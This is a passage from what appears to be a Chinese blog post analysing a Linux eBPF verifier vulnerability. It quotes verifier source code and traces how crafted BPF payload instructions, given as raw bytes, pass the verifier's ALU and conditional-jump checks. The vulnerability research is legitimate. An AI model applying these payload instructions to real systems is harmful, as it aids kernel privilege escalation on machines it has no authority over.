       err = check_ld_abs(env, insn);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == BPF_IMM) &#123;</span><br><span class="line">                err = check_ld_imm(env, insn);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">                insn_idx++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                verbose(<span class="string">&quot;invalid BPF_LD mode\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            verbose(<span class="string">&quot;unknown insn class %d\n&quot;</span>, class);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        insn_idx++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么来看第一行<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code></p><p>通过<code>BPF_CLASS</code>宏计算class后，可以得出class：<code>0xb4 &amp; 0x07 = 0x04</code></p><p>那么进入<code>if (class == BPF_ALU || class == BPF_ALU64)</code>分支，执行<code>check_alu_op</code>函数</p><p>来看看<code>check_alu_op</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* check validity of 32-bit and 64-bit arithmetic operations */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_alu_op</span><span class="params">(struct verifier_env *env, struct bpf_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> =</span> env-&gt;cur_state.regs;</span><br><span class="line">    u8 opcode = BPF_OP(insn-&gt;code); <span class="comment">// BPF_OP宏：#define BPF_OP(code) ((code) &amp; 0xf0)</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opcode == BPF_END || opcode == BPF_NEG) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_NEG) &#123;</span><br><span class="line">            <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != <span class="number">0</span> ||</span><br><span class="line">                insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                insn-&gt;off != <span class="number">0</span> || insn-&gt;imm != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_NEG uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">                (insn-&gt;imm != <span class="number">16</span> &amp;&amp; insn-&gt;imm != <span class="number">32</span> &amp;&amp; insn-&gt;imm != <span class="number">64</span>)) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_END uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check src operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;R%d pointer arithmetic prohibited\n&quot;</span>,</span><br><span class="line">                insn-&gt;dst_reg);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check dest operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123; <span class="comment">// 判断指令是否是MOV指令，第一句payload进入此分支</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123; </span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span> || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_MOV uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check src operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_MOV uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check dest operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP); <span class="comment">//检查操作数</span></span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">            <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">                <span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment">                 * copy register state to dest reg</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;R%d partial copy of pointer\n&quot;</span>,</span><br><span class="line">                        insn-&gt;src_reg);</span><br><span class="line">                    <span class="keyword">return</span> -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line">                regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">                regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">             * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode &gt; BPF_END) &#123;</span><br><span class="line">        verbose(<span class="string">&quot;invalid BPF_ALU opcode %x\n&quot;</span>, opcode);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    <span class="comment">/* all other ALU ops: and, sub, xor, add, ... */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> stack_relative = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span> || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_ALU uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* check src1 operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_ALU uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check src2 operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((opcode == BPF_MOD || opcode == BPF_DIV) &amp;&amp;</span><br><span class="line">            BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;div by zero\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((opcode == BPF_LSH || opcode == BPF_RSH ||</span><br><span class="line">             opcode == BPF_ARSH) &amp;&amp; BPF_SRC(insn-&gt;code) == BPF_K) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = BPF_CLASS(insn-&gt;code) == BPF_ALU64 ? <span class="number">64</span> : <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm &lt; <span class="number">0</span> || insn-&gt;imm &gt;= size) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;invalid shift %d\n&quot;</span>, insn-&gt;imm);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* pattern match &#x27;bpf_add Rx, imm&#x27; instruction */</span></span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_ADD &amp;&amp; BPF_CLASS(insn-&gt;code) == BPF_ALU64 &amp;&amp;</span><br><span class="line">            regs[insn-&gt;dst_reg].type == FRAME_PTR &amp;&amp;</span><br><span class="line">            BPF_SRC(insn-&gt;code) == BPF_K) &#123;</span><br><span class="line">            stack_relative = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;R%d pointer arithmetic prohibited\n&quot;</span>,</span><br><span class="line">                insn-&gt;dst_reg);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X &amp;&amp;</span><br><span class="line">               is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;R%d pointer arithmetic prohibited\n&quot;</span>,</span><br><span class="line">                insn-&gt;src_reg);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check dest operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stack_relative) &#123;</span><br><span class="line">            regs[insn-&gt;dst_reg].type = PTR_TO_STACK;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此函数中，先计算<code>opcode</code>的值：<code>0xb4 &amp; 0xf0 = 0xb0</code></p><p>此值为BPF_MOV宏的值，进入<code>else if (opcode == BPF_MOV)</code>分支</p><p>通过一系列校验后，我们主要关心的就是这里的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">     * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将<code>imm</code>，也即<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>中的<code>0xffffffff</code>保存进虚拟执行的寄存器中，记录此mov指令的结果</p><p>不急着往下走，先来看看<code>regs[insn-&gt;dst_reg].imm</code>以及<code>insn-&gt;imm</code>的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">        <span class="keyword">int</span> imm;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">         *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;        <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;    <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;    <span class="comment">/* source register */</span></span><br><span class="line">    __s16    off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32    imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这两个值的数据类型是一致的，都是32位有符号整数</p><p>到这儿没有什么问题，<code>check_alu_op</code>返回，<code>do_check</code>函数继续循环检查下一行指令</p><p>来看第二行指令 <code>\x55\x09\x02\x00\xff\xff\xff\xff</code></p><p>还是老样子，先计算class: <code>0x55 &amp; 0x07 = 0x05</code></p><p>此为<code>JMP</code>类型的指令，进入<code>else if (class == BPF_JMP)</code>分支，计算opcode：<code>0x55 &amp; 0xf0 = 0x50</code></p><p>根据opcode，执行<code>check_cond_jmp_op</code>函数</p><p>函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_cond_jmp_op</span><span class="params">(struct verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">                 struct bpf_insn *insn, <span class="keyword">int</span> *insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> =</span> env-&gt;cur_state.regs;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> *<span class="title">other_branch</span>;</span></span><br><span class="line">    u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opcode &gt; BPF_EXIT) &#123;</span><br><span class="line">        verbose(<span class="string">&quot;invalid BPF_JMP opcode %x\n&quot;</span>, opcode);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">        <span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span>) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;BPF_JMP uses reserved fields\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check src1 operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;R%d pointer comparison prohibited\n&quot;</span>,</span><br><span class="line">                insn-&gt;src_reg);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;BPF_JMP uses reserved fields\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check src2 operand */</span></span><br><span class="line">    err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 主要关注这里</span></span><br><span class="line">    <span class="comment">/* detect if R == 0 where R was initialized to zero earlier */</span></span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">        (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">            <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">             * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            *insn_idx += insn-&gt;off;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">             * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">             * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (!other_branch)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */</span></span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">        insn-&gt;imm == <span class="number">0</span> &amp;&amp; (opcode == BPF_JEQ ||</span><br><span class="line">                   opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">            <span class="comment">/* next fallthrough insn can access memory via</span></span><br><span class="line"><span class="comment">             * this register</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</span><br><span class="line">            <span class="comment">/* branch targer cannot access it, since reg == 0 */</span></span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</span><br><span class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">        verbose(<span class="string">&quot;R%d pointer comparison prohibited\n&quot;</span>, insn-&gt;dst_reg);</span><br><span class="line">        <span class="keyword">return</span> -EACCES;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">           (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">            <span class="comment">/* detect if (R == imm) goto</span></span><br><span class="line"><span class="comment">             * and in the target state recognize that R = imm</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* detect if (R != imm) goto</span></span><br><span class="line"><span class="comment">             * and in the fall-through state recognize that R = imm</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (log_level)</span><br><span class="line">        print_verifier_state(env);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 